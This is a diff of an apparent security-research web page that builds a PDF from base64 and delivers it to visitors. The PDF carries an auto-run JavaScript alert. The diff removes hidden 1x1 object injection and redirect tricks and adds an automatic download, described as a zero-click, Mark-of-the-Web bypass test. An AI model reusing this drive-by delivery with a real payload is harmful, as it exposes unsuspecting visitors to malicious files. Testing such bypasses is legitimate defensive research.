@@ -41,50 +41,24 @@
 
                 // Construct the PDF blob from our embedded Base64 string
                 const pdfBlob = base64ToBlob("JVBERi0xLjcKCjEgMCBvYmogICUgZW50cnkgcG9pbnQKPDwKICAvVHlwZSAvQ2F0YWxvZwogIC9QYWdlcyAyIDAgUgogIC9PcGVuQWN0aW9uIDw8CiAgICAvUyAvSmF2YVNjcmlwdAogICAgL0pTIChhcHAuYWxlcnQoJ1BERiBFeGVjdXRlZCAtIFNhZmUgUmVzZWFyY2gnKTspCiAgPj4KPj4KZW5kb2JqCgoyIDAgb2JqCjw8CiAgL1R5cGUgL1BhZ2VzCiAgL01lZGlhQm94IFsgMCAwIDIwMCAyMDAgXQogIC9Db3VudCAxCiAgL0tpZHMgWyAzIDAgUiBdCj4+CmVuZG9iagoKMyAwIG9iago8PAogIC9UeXBlIC9QYWdlCiAgL1BhcmVudCAyIDAgUgogIC9SZXNvdXJjZXMgPDwKICAgIC9Gb250IDw8CiAgICAgIC9GMSA0IDAgUHVibGljCiAgICA+PgogID4+CiAgL0NvbnRlbnRzIDUgMCBSCj4+CmVuZG9iagoKNCAwIG9iago8PAogIC9UeXBlIC9Gb250CiAgL1N1YnR5cGUgL1R5cGUxCiAgL0Jhc2VGb250IC9IZWx2ZXRpY2kKPj4KZW5kb2JqCgo1IDAgb2JqCjw8IC9MZW5ndGggNDQgPj4Kc3RyZWFtCkJUCjcwIDUwIFRECi9GMSAxMiBUZgwoSGVsbG8gV29ybGQhKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCgp4cmVmCjAgNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMTAgMDAwMDAgbiAKMDAwMDAwMDExMyAwMDAwMCBuIAowMDAwMDAwMjAwIDAwMDAwIG4gCjAwMDAwMDAzMDMgMDAwMDAgbiAKMDAwMDAwMDM4OSAwMDAwMCBuIAp0cmFpbGVyCjw8CiAgL1NpemUgNgogIC9Sb290IDEgMCBSCj4+CnN0YXJ0eHJlZgo0ODQKJSVFT0YK", "application/pdf");
-
-                // CRITICAL: We append '#FDF=' to the URL.
-                // This is the "Adobe Open Parameters" trick.
-                // It hints to the browser/plugin to treat this as an interactive PDF stream.
-                const pdfUrl = URL.createObjectURL(pdfBlob) + "#FDF=safe_research";
+                const pdfUrl = URL.createObjectURL(pdfBlob);
 
                 log("Stage 2: PDF Blob created at " + pdfUrl);
 
-                // Technique A: Object/Embed Injection (Forced Inline Rendering)
-                // We use an <object> tag instead of just an iframe.
-                // This is more aggressive at forcing the browser to load the plugin.
-                log("Attempting 'Auto-Open' via <object> Injection...");
+                // Option A: Trigger Download (Simulating the 'File Drop')
+                // This demonstrates the MotW bypass if the user saves it.
+                const link = document.createElement('a');
+                link.href = pdfUrl;
+                link.download = "research_payload.pdf";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
 
-                const obj = document.createElement('object');
-                obj.data = pdfUrl;
-                obj.type = "application/pdf";
-                obj.width = "1";
-                obj.height = "1";
-                obj.style.visibility = "hidden";
-                document.body.appendChild(obj);
+                log("Stage 3: File dropped to disk. Check Downloads folder.");
 
-                log("Stage 3: Object injected. Waiting for plugin execution...");
-
-                // Technique B: Window Navigation (The "Direct Open" Vector)
-                // If the object tag fails (e.g., built-in viewer blocks it),
-                // we try to navigate the current window to the PDF blob.
-                // This forces the browser to decide: "Render or Download?"
-                setTimeout(() => {
-                    log("Attempting fallback navigation (window.location)...");
-                    // window.location.href = pdfUrl; // Uncomment to force navigation
-                    log("Navigation skipped to keep page open. In a real attack, we would redirect.");
-                }, 500);
-
-                // Technique C: Fallback Download (for MotW evidence)
-                // We also trigger the download so you have the file for the PowerShell check.
-                setTimeout(() => {
-                    log("Triggering fallback download for MotW verification...");
-                    const link = document.createElement('a');
-                    link.href = pdfUrl;
-                    link.download = "research_payload.pdf";
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                }, 1000);
+                // Option B: Trigger Open (Simulating the 'Auto-Open')
+                // We open the blob URL in a new window to see if Adobe catches it.
+                // window.open(pdfUrl, '_blank');
             };
 
             // Auto-trigger on load (The "Zero-Click" simulation)
